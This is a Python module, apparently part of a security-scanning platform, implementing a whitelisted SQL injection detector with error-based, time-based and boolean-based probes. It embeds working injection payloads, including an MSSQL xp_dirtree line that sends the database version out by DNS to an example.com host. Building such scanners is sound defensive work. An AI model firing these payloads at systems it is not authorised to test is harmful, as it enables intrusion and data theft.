"""
SQL 注入检测工具模块

使用安全探测方式检测 SQL 注入漏洞。
支持基于时间的盲注检测和基于错误的检测两种方式。
"""

import logging
import time
from typing import Any

import httpx

from .base import BaseTool, ExecutionContext, RiskLevel

logger = logging.getLogger(__name__)

# 时间盲注载荷（使用 SLEEP 检测时间差异）
TIME_BASED_PAYLOADS = {
    "mysql_sleep": {
        "baseline": "1 AND SLEEP(0)",
        "inject": "1 AND SLEEP(3)",
    },
    "mysql_if_sleep": {
        "baseline": "1 AND IF(1=1,0,0)",
        "inject": "1 AND IF(1=1,SLEEP(3),0)",
    },
    "mysql_or_sleep": {
        "baseline": "1 OR SLEEP(0)",
        "inject": "1 OR SLEEP(3)",
    },
    "postgres_sleep": {
        "baseline": "1; SELECT pg_sleep(0)--",
        "inject": "1; SELECT pg_sleep(3)--",
    },
    "mssql_waitfor": {
        "baseline": "1; WAITFOR DELAY '0:0:0'--",
        "inject": "1; WAITFOR DELAY '0:0:3'--",
    },
}

# 布尔型盲注载荷（对比 true/false 条件的响应差异）
BOOLEAN_BASED_PAYLOADS = [
    {
        "name": "numeric_or_true",
        "true_condition": "1 OR 1=1",
        "false_condition": "1 OR 1=2",
    },
    {
        "name": "numeric_and_true",
        "true_condition": "1 AND 1=1",
        "false_condition": "1 AND 1=2",
    },
    {
        "name": "string_or_true",
        "true_condition": "1' OR '1'='1",
        "false_condition": "1' OR '1'='2",
    },
    {
        "name": "string_and_true",
        "true_condition": "1' AND '1'='1",
        "false_condition": "1' AND '1'='2",
    },
]

# 基于错误的检测载荷
ERROR_BASED_PAYLOADS = [
    "'",                    # 单引号 - 最经典的 SQL 注入探测
    "\"",                   # 双引号
    "' OR '1'='1",          # 布尔型注入
    "1 OR 1=1",             # 数字型注入
    "' UNION SELECT NULL--", # 联合查询注入
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # MySQL 报错注入
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",  # MySQL 重复键报错
    "1; DECLARE @q VARCHAR(100); SET @q='\\\\' + (SELECT @@version) + '.example.com\\a'; EXEC master.dbo.xp_dirtree @q--",  # MSSQL DNS 外带
]

# 常见 SQL 错误关键词（出现在响应中可能表示 SQL 注入）
SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "unclosed quotation",
    "quoted string not properly terminated",
    "you have an error in your sql syntax",
    "warning: mysql",
    "postgresql",
    "pg_query",
    "unterminated string",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error",
    "ora-01756",
    "ora-00933",
    "sqlite3.operationalerror",
]


class SQLInjectionTool(BaseTool):
    """
    SQL 注入检测工具

    使用安全的探测方式（时间盲注 + 错误检测）检测 SQL 注入漏洞。
    不执行破坏性操作，仅通过响应时间差异和错误信息判断。
    风险等级 L1（主动探测、有限写）。
    """

    name = "sqli_detect"
    description = "SQL 注入检测 - 使用安全探测方式检测 SQL 注入漏洞"
    risk_level = RiskLevel.L1

    def get_schema(self) -> dict:
        """返回 SQL 注入检测工具的参数 JSON Schema"""
        return {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "目标 URL 地址",
                },
                "param": {
                    "type": "string",
                    "description": "要测试的参数名称",
                },
                "method": {
                    "type": "string",
                    "description": "HTTP 请求方法",
                    "enum": ["GET", "POST"],
                    "default": "GET",
                },
                "headers": {
                    "type": "object",
                    "description": "自定义请求头",
                    "default": {},
                },
                "auth_token": {
                    "type": "string",
                    "description": "认证令牌（Bearer Token）",
                    "default": "",
                },
            },
            "required": ["url", "param"],
        }

    async def execute(self, params: dict, context: ExecutionContext) -> dict:
        """
        执行 SQL 注入检测

        先进行基于错误的检测，再进行时间盲注检测。

        Args:
            params: {url, param, method, headers, auth_token}
            context: 执行上下文

        Returns:
            {
                success: bool,
                vulnerable: bool,
                technique: str,
                evidence: {normal_time_ms, injected_time_ms, error_based_response},
                payload_used: str,
            }
        """
        url = params.get("url", "")
        param = params.get("param", "")
        method = params.get("method", "GET").upper()
        headers = params.get("headers", {})
        auth_token = params.get("auth_token", "")
        form_fields = params.get("form_fields") or []

        # 参数校验
        if not url:
            return self._make_error_result("url 参数不能为空")
        if not param:
            return self._make_error_result("param 参数不能为空")

        # 目标白名单校验
        if not self._validate_target(url, context):
            return self._make_error_result(
                f"目标 URL 不在允许的主机白名单内: {url}"
            )

        # 添加认证头
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"

        evidence = {
            "normal_time_ms": 0,
            "injected_time_ms": 0,
            "error_based_response": "",
        }

        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(context.timeout),
                verify=False,
            ) as client:

                # 第一步：基于错误的检测
                error_result = await self._test_error_based(
                    client, url, param, method, headers
                )
                if error_result["vulnerable"]:
                    evidence["error_based_response"] = error_result["error_snippet"]
                    return {
                        "success": True,
                        "vulnerable": True,
                        "technique": "error_based",
                        "evidence": evidence,
                        "payload_used": error_result["payload"],
                    }

                # 第二步：时间盲注检测
                time_result = await self._test_time_based(
                    client, url, param, method, headers
                )
                if time_result["vulnerable"]:
                    evidence["normal_time_ms"] = time_result["baseline_time_ms"]
                    evidence["injected_time_ms"] = time_result["inject_time_ms"]
                    return {
                        "success": True,
                        "vulnerable": True,
                        "technique": "time_based_blind",
                        "evidence": evidence,
                        "payload_used": time_result["payload"],
                    }

                # 第三步：布尔型盲注检测（对比 true/false 条件的响应差异）
                bool_result = await self._test_boolean_based(
                    client, url, param, method, headers
                )
                if bool_result["vulnerable"]:
                    evidence["boolean_based_diff"] = bool_result["diff_summary"]
                    return {
                        "success": True,
                        "vulnerable": True,
                        "technique": "boolean_based_blind",
                        "evidence": evidence,
                        "payload_used": bool_result["payload"],
                    }

                # 未发现漏洞
                return {
                    "success": True,
                    "vulnerable": False,
                    "technique": "",
                    "evidence": evidence,
                    "payload_used": "",
                }

        except httpx.TimeoutException:
            return self._make_error_result(f"请求超时: {url}")
        except Exception as e:
            logger.error("SQL 注入检测异常: %s - %s", url, str(e))
            return self._make_error_result(f"检测异常: {str(e)}")

    async def _test_error_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        method: str,
        headers: dict,
        form_fields: list[str] | None = None,
    ) -> dict:
        """
        基于错误的 SQL 注入检测

        发送包含特殊字符的请求，检查响应中是否包含 SQL 错误信息。

        Args:
            client: HTTP 客户端
            url: 目标 URL
            param: 测试参数
            method: HTTP 方法
            headers: 请求头

        Returns:
            {vulnerable: bool, payload: str, error_snippet: str}
        """
        for payload in ERROR_BASED_PAYLOADS:
            try:
                response = await self._send_request(
                    client, url, param, payload, method, headers, form_fields=form_fields
                )
                response_text = response.text.lower()

                # 检查响应中是否包含 SQL 错误模式
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern in response_text:
                        # 提取错误信息上下文（前后 100 字符）
                        idx = response_text.find(pattern)
                        start = max(0, idx - 50)
                        end = min(len(response_text), idx + len(pattern) + 50)
                        snippet = response.text[start:end]

                        logger.info(
                            "发现基于错误的 SQL 注入: url=%s, param=%s, pattern=%s",
                            url, param, pattern,
                        )
                        return {
                            "vulnerable": True,
                            "payload": payload,
                            "error_snippet": snippet,
                        }

            except Exception as e:
                logger.debug("错误检测载荷发送失败: %s - %s", payload, str(e))
                continue

        return {"vulnerable": False, "payload": "", "error_snippet": ""}

    async def _test_time_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        method: str,
        headers: dict,
        form_fields: list[str] | None = None,
    ) -> dict:
        """
        基于时间的盲注 SQL 注入检测

        通过对比 SLEEP(0) 和 SLEEP(3) 的响应时间差异判断注入点。
        时间差异超过 2 秒视为可能存在注入。

        Args:
            client: HTTP 客户端
            url: 目标 URL
            param: 测试参数
            method: HTTP 方法
            headers: 请求头

        Returns:
            {vulnerable: bool, payload: str, baseline_time_ms: int, inject_time_ms: int}
        """
        for db_type, payloads in TIME_BASED_PAYLOADS.items():
            try:
                # 发送基线请求（SLEEP(0)）
                start = time.monotonic()
                await self._send_request(
                    client, url, param, payloads["baseline"], method, headers, form_fields=form_fields
                )
                baseline_ms = int((time.monotonic() - start) * 1000)

                # 发送注入请求（SLEEP(3)）
                start = time.monotonic()
                await self._send_request(
                    client, url, param, payloads["inject"], method, headers, form_fields=form_fields
                )
                inject_ms = int((time.monotonic() - start) * 1000)

                # 判断时间差异是否显著（注入耗时比基线多 2000ms 以上）
                time_diff = inject_ms - baseline_ms
                if time_diff >= 2000:
                    logger.info(
                        "发现时间盲注 SQL 注入: url=%s, param=%s, db=%s, diff=%dms",
                        url, param, db_type, time_diff,
                    )
                    return {
                        "vulnerable": True,
                        "payload": payloads["inject"],
                        "baseline_time_ms": baseline_ms,
                        "inject_time_ms": inject_ms,
                    }

            except Exception as e:
                logger.debug("时间盲注载荷发送失败 (%s): %s", db_type, str(e))
                continue

        return {
            "vulnerable": False,
            "payload": "",
            "baseline_time_ms": 0,
            "inject_time_ms": 0,
        }

    async def _test_boolean_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        method: str,
        headers: dict,
        form_fields: list[str] | None = None,
    ) -> dict:
        """
        基于布尔条件的盲注 SQL 注入检测

        通过对比 true 条件和 false 条件的响应差异判断注入点。
        如果响应长度或内容有明显差异，则可能存在注入。

        Args:
            client: HTTP 客户端
            url: 目标 URL
            param: 测试参数
            method: HTTP 方法
            headers: 请求头

        Returns:
            {vulnerable: bool, payload: str, diff_summary: str}
        """
        import re

        for payload_set in BOOLEAN_BASED_PAYLOADS:
            try:
                name = payload_set["name"]
                true_cond = payload_set["true_condition"]
                false_cond = payload_set["false_condition"]

                # 发送 true 条件请求
                true_response = await self._send_request(
                    client, url, param, true_cond, method, headers, form_fields=form_fields
                )
                true_body = true_response.text
                true_len = len(true_body)
                true_status = true_response.status_code

                # 发送 false 条件请求
                false_response = await self._send_request(
                    client, url, param, false_cond, method, headers, form_fields=form_fields
                )
                false_body = false_response.text
                false_len = len(false_body)
                false_status = false_response.status_code

                # 检测差异
                len_diff = abs(true_len - false_len)
                status_diff = true_status != false_status

                # 内容指纹对比（去数字）
                true_fp = re.sub(r'\d+', '', true_body)
                false_fp = re.sub(r'\d+', '', false_body)
                content_diff = true_fp != false_fp

                # 如果长度差异 > 50 字符 或 状态码不同 或 内容指纹不同，则认为有差异
                if len_diff > 50 or status_diff or content_diff:
                    diff_summary = f"len_diff={len_diff}, status_diff={status_diff}, content_diff={content_diff}"
                    logger.info(
                        "发现布尔型盲注 SQL 注入: url=%s, param=%s, name=%s, %s",
                        url, param, name, diff_summary,
                    )
                    return {
                        "vulnerable": True,
                        "payload": f"{true_cond} vs {false_cond}",
                        "diff_summary": diff_summary,
                    }

            except Exception as e:
                logger.debug("布尔盲注载荷发送失败 (%s): %s", payload_set.get("name", ""), str(e))
                continue

        return {
            "vulnerable": False,
            "payload": "",
            "diff_summary": "",
        }

    @staticmethod
    async def _send_request(
        client: httpx.AsyncClient,
        url: str,
        param: str,
        value: str,
        method: str,
        headers: dict,
        form_fields: list[str] | None = None,
    ) -> httpx.Response:
        """
        发送带有注入参数的 HTTP 请求

        Args:
            client: HTTP 客户端
            url: 目标 URL
            param: 参数名
            value: 参数值（注入载荷）
            method: HTTP 方法
            headers: 请求头
            form_fields: 完整表单字段集 (POST 时重构 body, L2/PR-3)

        Returns:
            HTTP 响应对象
        """
        if method == "GET":
            # GET 请求：参数拼接到 URL
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{param}={value}"
            return await client.get(full_url, headers=headers)
        else:
            # POST 请求：用完整表单字段重构 body, 命中参数填 value, 其余填空
            data = {}
            fields = list(form_fields) if form_fields else []
            if param:
                data[param] = value
            for f in fields:
                if f and f not in data:
                    data[f] = ""
            if not data and param:
                data[param] = value
            return await client.post(url, data=data, headers=headers)
